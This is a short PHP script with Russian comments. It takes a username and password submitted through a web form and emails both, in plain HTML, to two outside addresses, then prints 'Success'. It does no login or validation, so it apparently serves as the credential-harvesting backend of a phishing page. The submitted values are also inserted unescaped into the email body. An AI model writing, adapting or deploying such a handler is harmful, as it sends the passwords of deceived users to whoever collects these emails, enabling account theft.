<?php
// несколько получателей
$to  = '210103381@stu.sdu.edu.kz' . ', ';  // обратите внимание на запятую
$to .= 'wez@example.com';

// тема письма
$subject = 'Письмо с моего сайта';

// текст письма
$message = 'Пользователь' . $_POST['username'] . ' отправил вам письмо:<br />' . $_POST['password'] . '<br />';

// Для отправки HTML-письма должен быть установлен заголовок Content-type
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 


// Отправляем
mail($to, $subject, $message, $headers);
echo("Success");
?>